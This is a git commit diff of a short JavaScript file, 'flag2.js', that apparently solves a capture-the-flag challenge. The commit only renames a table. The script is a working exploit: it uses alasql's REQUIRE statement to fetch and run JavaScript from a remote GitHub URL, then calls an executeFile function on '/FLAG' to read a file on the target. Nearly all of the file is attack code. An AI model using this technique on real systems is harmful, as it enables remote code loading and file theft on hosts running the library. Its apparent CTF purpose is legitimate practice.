e6e5d4262339eef5207edd6c6f76a25fcf3c4d08
vr2 <hydw9898@gmail.com>
2024-11-15 09:42:31 +0900

    Update flag2.js

--- flag2.js
+++ flag2.js
@@ -2,8 +2,8 @@ const alasql = require('alasql');
 
 alasql('REQUIRE "https://raw.githubusercontent.com/vr2/1/refs/heads/main/flag.js"');
 
-alasql('CREATE TABLE woo (content TEXT)');
-alasql.tables.woo.data = [
+alasql('CREATE TABLE genie (content TEXT)');
+alasql.tables.genie.data = [
     {content:"test"}
 ];
-alasql('INSERT INTO woo VALUES (executeFile("/FLAG"))');
+alasql('INSERT INTO genie VALUES (executeFile("/FLAG"))');
